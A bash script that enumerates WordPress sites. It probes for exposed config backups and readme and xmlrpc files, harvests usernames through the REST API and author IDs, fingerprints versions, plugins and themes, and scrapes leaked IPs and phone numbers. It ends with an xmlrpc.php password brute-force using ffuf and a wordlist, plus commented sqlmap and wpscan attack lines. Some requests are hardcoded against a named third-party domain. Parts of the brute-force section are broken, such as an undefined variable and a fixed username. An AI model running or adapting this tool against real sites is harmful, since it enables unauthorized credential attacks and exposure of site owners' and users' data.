#!/bin/bash

url="https://xx.com"

rm output_wordpress.json 2>&1

# Checking WP directory location (Robots.txt)
if [[ -n $(curl $url/robots.txt 2>&1 | grep -iE "Disallow|Allow") ]]; then
    echo "[Info] Robots.txt found, Wordpress dir. found"
    curl $url/robots.txt 2>&1 | grep -iE "Disallow|Allow" | jq -R 'split("\n") | map(split(": ") | {(.[0]): .[1]}) | add' >>output_wordpress.json
    # Checking if there is a different path for accessing to the WP
    path=$(cat output_wordpress.json | jq -r '.Disallow' | grep -i / | sed 's/wp-admin\///g' | tr -d '/')
    # /wp-admin/ inside robots.txt
    if [ "$path" == "wp-admin" ]; then
        path=""
    else
        echo "Found custom WP dir. : $path"
    fi
else
    echo "[Info] Robots.txt not found"
fi

######################################################################################################

# Checking common WP files
curl_return="null"
# USAGE : $1 PAGE NAME | $2 PAGE WORD DETAILS FOR FORBIDDEN ACTIONS
Check_page_exist() {
    page_name=$1
    page_words=$2

    # Starting here
    echo "[Info] Checking $page_name"

    # If WP is at the root dir. else we're going to the custom WP dir.
    if [ -z $path ]; then
        curl_return=$(curl -s $url/$page_name -L 2>&1)
        curl_return_grep=$(echo $curl_return | grep -iE "$page_words")
        status_code=$(curl -Lw "%{http_code}" -o /dev/null -s $url/$page_name)
        echo "Curling $url/$page_name, with status : $status_code"
    else
        # Let's check path /
        curl_return=$(curl -s $url/$page_name -L 2>&1)
        curl_return_grep=$(echo $curl_return | grep -iE "$page_words")
        status_code=$(curl -Lw "%{http_code}" -o /dev/null -s $url/$page_name)
        echo "Curling $url/$page_name, with status : $status_code"
        # Let's check path ex. /wp/
        curl_return2=$(curl -s $url/$path/$page_name -L 2>&1 | grep -iE "$page_words")
        curl_return_grep2=$(echo $curl_return2 | grep -iE "$page_words")
        status_code2=$(curl -Lw "%{http_code}" -o /dev/null -s $url/$path/$page_name)
        echo "Curling $url/$path/$page_name, with status : $status_code2"

        # Checking only for /wp/ path as an example
        if [ "$status_code2" -eq 200 ] || [ "$status_code2" -eq 302 ]; then
            # If the page exists but return an error, or something you're not allowed to (it means that hardening page is ok)
            if [ ! "$curl_return_grep2" ]; then
                echo "[Good] Page $page_name in $path unsecure"
                echo "{\"$page_name\":\"/$page_name\"}" | jq -c . | jq . >>output_wordpress.json
                # SCREENSHOT ?
            else
                echo "$page_name in $path is secure"
            fi
        fi
    fi
    # Checking only for / path
    # If the page return something (code 200 or 302)
    #if [ "$status_code" -ne 404 ] || [ "$status_code" -ne 301 ]; then
    if [ "$status_code" -eq 200 ] || [ "$status_code" -eq 302 ]; then
        # If the page exists but return an error, or something you're not allowed to (it means that hardening page is ok)
        if [ ! "$curl_return_grep" ]; then
            echo "[!] Page $page_name unsecure"
            echo "{\"$page_name\":\"/$page_name\"}" | jq -c . | jq . >>output_wordpress.json
            # SCREENSHOT ?
        else
            echo "$page_name is secure"
        fi
    fi
}

echo "==== Checking WP critics pages ====="
# USAGE : $1 PAGE NAME | $2 WORD IN THE PAGE THAT INDICATES HARDENING
Check_page_exist "readme.html" "²" # Usually contains Bienvenue|Welcome
Check_page_exist "wp-activate.php" "Erreur|Error"
Check_page_exist "xmlrpc.php" "²" # Usually contains Server
Check_page_exist "wp-mail.php" "administrator|administrateur"
Check_page_exist ".htaccess" "forbidden"
Check_page_exist "wp-config.php" ""
Check_page_exist "wp-config.php.bak" "²"
Check_page_exist "wp-config.php.old" "²"
Check_page_exist "wp-config.php.ext~" "²"
Check_page_exist "wp-config.php.ext.swp" "²"

Check_page_exist "wp-admin/login.php" "²" # Usually contains administrator|administrateur
Check_page_exist "wp-admin/wp-login.php" "²"
Check_page_exist "login.php" "²"
Check_page_exist "wp-login.php" "²"

Check_page_exist "wp-content/themes/twentyseventeen/assets" "²" # All dir. visible by default, browser the content then !

echo "==== Checking WP versions ====="

# Grep the WP version from index.php
Check_page_exist "index.php" "²" # Usually contains users slug/id/email
wp_info_version=$(echo "$curl_return" | grep -oP '(?<=WordPress )[\d.]+')
if [ -n "$curl_return" ]; then
    echo "[!] WP version found in index.php : $wp_info_version"
    echo "{\"WP version index.php\": \"$wp_info_version\"}" | jq -c . | jq . >>output_wordpress.json
fi

# Grep the WP version from wp-links-opml.php
Check_page_exist "wp-links-opml.php" "²" # Usually contains users slug/id/email
wp_info_version=$(echo "$curl_return" | grep -oP '(?<=WordPress\/)[\d.]+')
if [ -n "$curl_return" ]; then
    echo "[!] WP version found in wp-links-opml.php : $wp_info_version"
    echo "{\"WP version wp-links-opml.php\": \"$wp_info_version\"}" | jq -c . | jq . >>output_wordpress.json
fi

# Grep the WP version from /feed
Check_page_exist "feed" "²" # Usually contains users slug/id/email
wp_info_version=$(echo "$curl_return" | grep -oP '(?<=\?v=)[^<]+')
if [ -n "$curl_return" ]; then
    echo "[!] WP version found in /feed : $wp_info_version"
    echo "{\"WP version /feed\": \"$wp_info_version\"}" | jq -c . | jq . >>output_wordpress.json
fi

# Grep the PHP version from \?author\=1
Check_page_exist "\?author\=1" "²"
wp_info_version=$(echo "$curl_return" | grep -i "x-powered-by: " | awk -F: '{print $2}')
if [ -n "$curl_return" ]; then
    echo "[!] PHP version found in /\?author\=1 : $wp_info_version"
    echo "{\"PHP version\": \"$wp_info_version\"}" | jq -c . | jq . >>output_wordpress.json
fi

# Grep the server type from \?author\=1
Check_page_exist "\?author\=1" "²"
wp_info_version_php=$(echo "$curl_return" | grep -i "x-powered-by: " | awk -F: '{print $2}')
wp_info_version_server=$(echo "$curl_return" | grep -i "server: " | awk -F: '{print $2}')
wp_info_version_wp=$(echo "$curl_return" | grep -i "x-redirect-by: " | awk -F: '{print $2}')

if [ -n "$curl_return" ]; then
    if [ -n "$wp_info_version_php" ]; then
        echo "[!] PHP version found in /\?author\=1 : $wp_info_version_php"
        echo "{\"PHP version\": \"$wp_info_version_php\"}" | jq -c . | jq . >>output_wordpress.json
    fi
    if [ -n "$wp_info_version_server" ]; then
        echo "[!] Server version found in /\?author\=1 : $wp_info_version_server"
        echo "{\"Server version\": \"$wp_info_version_server\"}" | jq -c . | jq . >>output_wordpress.json
    fi
    if [ -n "$wp_info_version_wp" ]; then
        echo "[!] WP tag found in /\?author\=1 : $wp_info_version_wp"
        echo "{\"WP tag \": \"$wp_info_version_wp\"}" | jq -c . | jq . >>output_wordpress.json
    fi
fi

echo "==== Checking WP users ====="
# Checking Wordpress users list
Check_page_exist "wp-json/wp/v2/users" "²" # Usually contains users slug/id/email
if [ -n "$curl_return" ]; then
    echo "[Info] Users added in output_wordpress.json"
    echo "$curl_return" | jq '.[] | {name: .name, slug: .slug, href: .link}' >>output_wordpress.json
fi
Check_page_exist "?rest_route=/wp/v2/users" "²" # Usually contains users slug/id/email
if [ -n "$curl_return" ]; then
    echo "[Info] Users added in output_wordpress.json"
    echo "$curl_return" | jq '.[] | {name: .name, slug: .slug, href: .link}' >>output_wordpress.json
fi

# Get a valid user :
for i in {1..10}; do
    user_link=$(curl -s -I -X GET "$url/?author=$i" | grep -i 'location:' | awk -Fn: '{print $2}' | tr -d '[:cntrl:]')
    if [ -n "$user_link" ]; then
        echo "[Info] User link added in output_wordpress.json : $user_link"
        echo "{\"User link \": \"$user_link\"}" | jq -c . | jq . >>output_wordpress.json
    fi
done

echo "==== Checking IP & phone leaks ====="

# Check for IP leaking & phone number
Check_page_exist "wp-json/wp/v2/pages" "²"
wp_ip_leak=$(echo "$curl_return" | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | tr -d '[:cntrl:]')
if [ -n "$wp_ip_leak" ]; then
    echo "[Info] IP leak added in output_wordpress.json : $wp_ip_leak"
    echo "{\"IP leak \": \"$wp_ip_leak\"}" | jq -c . | jq . >>output_wordpress.json
fi
wp_phone_leak=$(echo "$curl_return" | grep -oE 'tel:[+]?[0-9]+' | tr -d '[:cntrl:]')
if [ -n "$wp_phone_leak" ]; then
    echo "[Info] Phone leak added in output_wordpress.json : $wp_phone_leak"
    echo "{\"IP leak \": \"$wp_phone_leak\"}" | jq -c . | jq . >>output_wordpress.json
fi

# Checking Wordpress info (WP version - PHP version - server type, etc.)
# Where Wordpress is in the main page ?
wp_info=$(curl -Ls $url | grep -i 'Wordpress')
if [ -n "$wp_info" ]; then
    echo "[Info] Searching Wordpress word in /index.php"
    echo "Wordpress word in index.php : $wp_info" >>output_wordpress.json
fi
# List the "meta name" tag on the main page, for the twitter tag infos, WP version, location of upload dir.
wp_info=$(curl -Ls $url | grep -i 'meta name=')
if [ -n "$wp_info" ]; then
    echo "[Info] Searching meta name tag in /index.php"
    echo "'meta name=' in index.php : $wp_info" >>output_wordpress.json
fi
# List CSS versions, for looking plugins infos
wp_info=$(curl -Ls $url | grep -i 'css?ver=')
if [ -n "$wp_info" ]; then
    echo "[Info] Searching css?ver= in /index.php"
    echo "'css?ver=' in index.php : $wp_info" >>output_wordpress.json
fi
# List JS versions, for looking plugins infos
# List the "meta name" tag on the main page, for the twitter tag infos, WP version, location of upload dir.
wp_info=$(curl -Ls $url | grep -i '.js?=')
if [ -n "$wp_info" ]; then
    echo "[Info] Searching Wordpress word in /index.php"
    echo "'.js?=' in index.php : $wp_info" >>output_wordpress.json
fi

# sqlmap -u "target URL" --dbs

# bruteforcing login :
# wpscan --url http://site.wekor.thm/wordpress/-U user.txt -P /usr/share/wordlists/rockyou.txt -vv

# Get plugins :
wp_info=$(curl -s -X GET https://transactis.fr | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2)
echo "Plugins list : $wp_info" >> output_wordpress.json

# Extract versions in general :
wp_info=$(curl -s -X GET https://transactis.fr | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2)
echo "Extract versions : $wp_info" >> output_wordpress.json

# Get themes :
wp_info=$(curl -s -X GET $url | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2)
echo "Themes list : $wp_info" >> output_wordpress.json



# Exploiting xmlrpc by bruteforcing users
# Looping through each user
for user in $(cat output_wordpress.json | jq -r '.name | select(.)' | sort -u); do
    xmlrpc_listmethods=$(echo $curl_xmlrpc | grep -i "system.listMethods")
    if [ -n "$xmlrpc_listmethods" ]; then
        echo "[!] List methods access from xmlrpc.php"
        echo "{\"xmlrpc \": \"list methods\"}" | jq -c . | jq . >>output_wordpress.json
        username="admin6991"
        echo "Starting FFUF"
        sudo ffuf -w "/home/kali/Offensive-Tools/tools/SecLists/Passwords/Common-Credentials/best1050.txt" -X POST \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
            -H "Host: $(echo "$url" | sed 's/https:\/\///')" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Content-Length: 227" \
            -d "<?xml version='1.0' encoding='UTF-8'?>
        <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
        <param><value>{{$username}}</value></param>
        <param><value>{{FUZZ}}</value></param>
        </params>
        </methodCall>" \
            -u $url/xmlrpc.php -

    fi
done


